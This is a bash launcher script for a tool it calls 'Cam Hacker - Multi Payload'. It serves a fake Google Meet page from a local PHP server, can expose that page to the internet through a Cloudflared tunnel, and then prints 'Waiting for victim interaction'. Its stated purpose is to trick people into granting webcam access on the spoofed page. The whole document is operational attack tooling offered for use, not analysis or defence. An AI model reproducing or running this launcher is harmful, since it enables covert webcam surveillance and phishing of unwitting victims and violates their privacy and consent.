#!/bin/bash

SITE_DIR="sites/google_meet_cam"
SERVER_DIR=".server/www"
PORT=8080

RED="\033[1;31m"
GREEN="\033[1;32m"
CYAN="\033[1;36m"
RESET="\033[0m"

function banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║       Cam Hacker - Multi Payload      ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${RESET}"
}

function start_php_server() {
    mkdir -p $SERVER_DIR
    cp -r $SITE_DIR/* $SERVER_DIR/
    cd $SERVER_DIR && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
    echo -e "${GREEN}[+] PHP server started at http://127.0.0.1:$PORT${RESET}"
}

function start_cloudflared() {
    echo -e "${GREEN}[+] Starting Cloudflared tunnel...${RESET}"
    cloudflared tunnel -url http://127.0.0.1:$PORT > ../cloudflared.log 2>&1 &
    sleep 6
    URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' ../cloudflared.log | head -n 1)
    if [[ $URL ]]; then
        echo -e "${GREEN}[+] Public URL: $URL${RESET}"
    else
        echo -e "${RED}[!] Failed to get Cloudflared URL. Make sure it's installed.${RESET}"
        exit 1
    fi
    echo -e "${CYAN}📡 Waiting for victim interaction...${RESET}"
    echo -e "${CYAN}[i] Press Ctrl + C to stop the server and exit.${RESET}"
    while true; do sleep 1; done
}

# Run launcher
banner
echo -e "${CYAN}[1] Launch Google Meet Cam Hacker${RESET}"
read -p $'Choose an option: ' opt

if [[ $opt == 1 ]]; then
    echo -e "${CYAN}Choose tunneling option:${RESET}"
    echo "[1] Localhost"
    echo "[2] Cloudflared"
    read -p $'Your choice: ' tunnel

    start_php_server

    if [[ $tunnel == 1 ]]; then
        echo -e "${GREEN}[+] Localhost server running. Open http://127.0.0.1:$PORT${RESET}"
        echo -e "${CYAN}📡 Waiting for victim interaction...${RESET}"
        echo -e "${CYAN}[i] Press Ctrl + C to stop the server and exit.${RESET}"
        while true; do sleep 1; done
    elif [[ $tunnel == 2 ]]; then
        start_cloudflared
    else
        echo -e "${RED}[!] Invalid tunneling option.${RESET}"
        exit 1
    fi
else
    echo -e "${RED}[!] Invalid option${RESET}"
fi
